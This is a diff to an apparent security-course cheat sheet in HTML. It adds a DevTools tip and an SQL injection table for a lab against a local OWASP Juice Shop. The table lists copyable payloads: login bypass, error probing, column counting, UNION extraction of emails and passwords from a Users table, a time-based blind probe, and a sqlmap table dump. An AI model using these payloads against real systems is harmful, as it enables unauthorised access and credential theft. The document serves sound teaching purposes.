@@ -84,6 +84,17 @@
               <td>Evaluated in browser console; returns empty string if HttpOnly flag is active</td>
               <td><a href="./labs/lab01.html" class="badge-lab-ref">Lab 01</a></td>
             </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>DevTools → Network → click request → Response</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('DevTools → Network → click request → Response')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Read any request and its raw response</strong></td>
+              <td>The browser is a free proxy. Inspect what the app actually sent and what came back, including leaked SQL errors (Firefox: <span class="flag-pill">Edit and Resend</span> to tweak and replay)</td>
+              <td><a href="./labs/lab03.html#read-the-error" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
           </tbody>
         </table>
       </div>
@@ -329,6 +340,94 @@
               <td><strong>Launch OWASP Juice Shop</strong></td>
               <td><span class="flag-pill">-d</span> Detached, <span class="flag-pill">--rm</span> Auto-remove, <span class="flag-pill">-p</span> Publish port</td>
               <td><a href="./labs/lab02.html#target-juice-shop" class="badge-lab-ref">Lab 02</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Category: SQL Injection (Lab 03) -->
+    <section class="cheat-section" id="sql-injection">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">💉</span>
+        <h2 class="cheat-section__title">SQL Injection (Lab 03)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Payload / Command</th>
+              <th style="width:25%;">Action</th>
+              <th style="width:25%;">How it works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>' OR 1=1--</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('\' OR 1=1--')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Auth bypass in login</strong></td>
+              <td>Quote closes the string, <span class="flag-pill">OR 1=1</span> is always true, <span class="flag-pill">--</span> comments out the password check</td>
+              <td><a href="./labs/lab03.html#auth-bypass" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>q=')</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('q=\')')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Error probe (is it injectable?)</strong></td>
+              <td>Input here sits in nested parens, so <span class="flag-pill">')</span> breaks the query where a lone quote returns an empty 200. A SQL error back means input reaches the DB unfiltered</td>
+              <td><a href="./labs/lab03.html#read-the-error" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>apple')) ORDER BY 10--</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('apple\')) ORDER BY 10--')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Count columns</strong></td>
+              <td>Increase the number until it errors. The last working number is the column count UNION needs (9 in current Juice Shop)</td>
+              <td><a href="./labs/lab03.html#union-extraction" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>x')) UNION SELECT email,password,'3','4','5','6','7','8','9' FROM Users--</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('x\')) UNION SELECT email,password,\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--')">Copy</button>
+                </div>
+              </td>
+              <td><strong>UNION data extraction</strong></td>
+              <td>Staple a second SELECT on with matching column count to pull the Users table into the response</td>
+              <td><a href="./labs/lab03.html#union-extraction" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>' OR SLEEP(5)--</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('\' OR SLEEP(5)--')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Time-based blind probe</strong></td>
+              <td>No data or error shown, but a 5-second delay means the condition was true. Yes/no one query at a time</td>
+              <td><a href="./labs/lab03.html#going-pro" class="badge-lab-ref">Lab 03</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch -T Users --dump</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('sqlmap -u &quot;http://localhost:3000/rest/products/search?q=apple&quot; --batch -T Users --dump')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Automated dump of a table</strong></td>
+              <td><span class="flag-pill">-u</span> target URL, <span class="flag-pill">--batch</span> no prompts, <span class="flag-pill">-T</span> table, <span class="flag-pill">--dump</span> extract rows</td>
+              <td><a href="./labs/lab03.html#sqlmap" class="badge-lab-ref">Lab 03</a></td>
             </tr>
           </tbody>
         </table>
